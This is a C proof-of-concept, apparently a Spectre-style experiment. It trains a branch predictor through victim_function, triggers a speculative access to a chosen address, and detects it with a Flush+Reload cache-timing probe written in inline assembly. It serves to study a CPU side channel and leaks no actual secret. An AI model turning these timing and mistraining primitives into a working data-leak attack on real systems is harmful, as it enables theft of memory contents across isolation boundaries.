#include <stdio.h>

#include "spec.h"

static inline void
flush(void const*const ptr)
{
  asm volatile (
     "mfence         \n"
     "clflush 0(%0)  \n"
     :
     : "r" (ptr)
     :
  );
}

static inline unsigned long
timed_probe(void const*const ptr)
{
  volatile unsigned long time;

  asm volatile (
    "mfence             \n"
    "lfence             \n"
    "rdtsc              \n"
    "lfence             \n"
    "movl %%eax, %%esi  \n"
    "movl (%1), %%eax   \n"
    "lfence             \n"
    "rdtsc              \n"
    "subl %%esi, %%eax  \n"
    "clflush 0(%1)      \n"
    : "=a" (time)
    : "c" (ptr)
    :  "%esi", "%edx");

  return time;
}

static volatile int val = 2;

void
spec_access(void const*const ptr)
{
    for (int i = 0; i < 1000; ++i) {
        valid_ptr = (void *)&val;
        flush(&valid_ptr);
        for (volatile int z = 0; z < 100; ++z) {}
        val = victim_function((void *)&val);
    }

    valid_ptr = NULL;
    flush(&valid_ptr);
    for (volatile int z = 0; z < 100; ++z) {}
    val = victim_function(ptr);
}

unsigned char abba[256 * 512];

int
main(void)
{
    /* fault all the pages */
    for (int i = 0; i < sizeof(abba); ++i) {
        abba[i] = 0x1;
    }
    for (int i = 0; i < sizeof(abba); ++i) {
        flush(&abba[i]);
    }

    for (int i = 0; i < 10; ++i) {
        printf("%lu\n", timed_probe(&abba[256 * i]));
    }

    spec_access(&abba[256 * 100]);
    printf("%lu\n", timed_probe(&abba[256 * 100]));

    spec_access(&abba[256 * 110]);
    printf("%lu\n", timed_probe(&abba[256 * 110]));

    spec_access(&abba[256 * 120]);
    printf("%lu\n", timed_probe(&abba[256 * 120]));
}
